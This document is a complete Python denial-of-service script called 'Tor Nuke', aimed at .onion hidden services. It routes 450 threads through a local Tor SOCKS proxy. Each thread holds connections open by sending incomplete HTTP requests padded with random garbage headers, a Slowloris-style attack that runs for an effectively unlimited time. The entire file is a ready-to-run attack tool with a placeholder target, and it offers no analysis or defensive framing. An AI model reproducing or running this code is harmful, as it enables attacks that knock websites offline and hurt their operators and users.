#!/usr/bin/env python3

import threading
import random
import socket
import socks
import time
import os


TARGET_HOST = "putyouronionhere.onion"
TARGET_PORT = 80
THREADS     = 450
DURATION    = 99999999

if ".onion" not in TARGET_HOST:
    print("[-] Put only the raw .onion domain, dummy.")
    exit()

print(f"""
{'='*56}
  ████████╗ ██████╗ ██████╗      ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
  ╚══██╔══╝██╔═══██╗██╔══██╗     ████╗  ██║██║   ██║██║  ██║██╔════╝
     ██║   ██║   ██║██████╔╝     ██╔██╗ ██║██║   ██║███████║█████╗  
     ██║   ██║   ██║██╔══██╗     ██║╚██╗██║██║   ██║██╔══██║██╔══╝  
     ██║   ╚██████╔╝██║  ██║     ██║ ╚████║╚██████╔╝██║  ██║███████╗
     ╚═╝    ╚═════╝ ╚═╝  ╚═╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
{'='*56}
                 Tor Nuke - 8GB RAM Edition
    Target  → {TARGET_HOST}:{TARGET_PORT}
    Threads → {THREADS}
    RAM     → ~1.4 GB peak
    Ctrl+C to stop - Let it cook
{'='*56}
""")

def nuke():
    bytes_sent = 0
    while time.time() < end_time:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
            s.settimeout(15)
            s.connect((TARGET_HOST, TARGET_PORT))
            
            req = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n"
            s.sendall(req.encode())
            bytes_sent += len(req)

            while time.time() < end_time:
                garbage = b"X-" + os.urandom(16) + b": " + os.urandom(random.randint(500, 1500)) + b"\r\n"
                s.sendall(garbage)
                bytes_sent += len(garbage)
                time.sleep(random.uniform(1.5, 5))
                
        except:
            pass
        finally:
            try: s.close()
            except: pass

end_time = time.time() + DURATION
for i in range(THREADS):
    t = threading.Thread(target=nuke, daemon=True)
    t.start()

try:
    while True:
        time.sleep(100)
except KeyboardInterrupt:
    print("\nTor Nuke stopped by user. Target should be toast by now.")